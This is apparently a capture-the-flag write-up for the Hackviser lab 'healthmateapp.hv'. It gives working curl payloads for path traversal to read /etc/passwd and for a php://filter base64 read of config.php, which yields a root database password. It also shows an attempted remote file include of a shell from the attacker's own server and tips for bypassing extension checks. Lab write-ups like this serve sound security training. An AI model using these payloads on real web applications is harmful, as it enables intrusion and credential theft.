---
title: Remote File Inclusion (RFI) and file read in healthmateapp.hv
date: 2025-09-29 00:00:00 +0000
categories: [writeups, hackviser]
tags: [rfi, lfi, php-filters, web]
excerpt: "Discovered file read via path traversal and php://filter base64 to exfiltrate config.php credentials after RFI was blocked by allow_url_include=0."
---

## Goal

Find the second user on the system and retrieve database credentials from `config.php` in the Hackviser room `healthmateapp.hv`.

## Summary

- The app entry was `http://healthmateapp.hv/index.php?page=home.php`.
- Path traversal allowed reading system files like `/etc/passwd` via the `page` parameter.
- Classic RFI to an external server failed because `allow_url_include=0`.
- Used `php://filter/convert.base64-encode/resource=...` to read `config.php` source as base64, then decoded locally to obtain DB credentials.

## Path traversal to enumerate users

I confirmed file read by requesting `/etc/passwd` through `page`:

```bash
curl -s "http://healthmateapp.hv/index.php?page=../../../../etc/passwd" | sed -n '1,40p'
```

From the output, the second user on the system is: `daemon`.

## RFI attempts and filter bypass

- I tried RFI to a local Python server to gain command execution, e.g. `?page=http://<my-ip>:8000/shell.txt`, but the application returned (from `index.php`) that `allow_url_include=0`, blocking remote includes.
- I then pivoted to PHP filters to read source files in base64.

### Read `config.php` with php://filter

```bash
# retrieve base64-encoded source of config.php (adjust traversal depth as needed)
curl -s "http://healthmateapp.hv/index.php?page=php://filter/convert.base64-encode/resource=../../../../var/www/html/config.php" \
  | sed -n '1,200p' > base64.txt

base64 -d base64.txt > config.php
head -40 config.php
```

Decoded `config.php` content:

```php
<?php
    try{
        $host = 'localhost';
        $db_name = 'hv_database';
        $charset = 'utf8';
        $username = 'root';
        $password = '6UabF6Ff7XJq8PMtA';
    
        $db = new PDO("mysql:host=$host;dbname=$db_name;charset=$charset",$username,$password);
    } catch(PDOException $e){
       
    }
?>
```

- Database password: `6UabF6Ff7XJq8PMtA`.
- With DB creds, further exploitation (DB dump, auth bypass) is possible depending on app logic.

## Notes

- If traversal depth differs, adjust `../../../../` accordingly.
- If the app applies extension whitelisting, try appending a null byte or a permitted extension where applicable (older PHP only).
- For large files, use `sed -n 'start,endp'` to paginate or `dd` with `ibs/obs` in case filters limit output size.
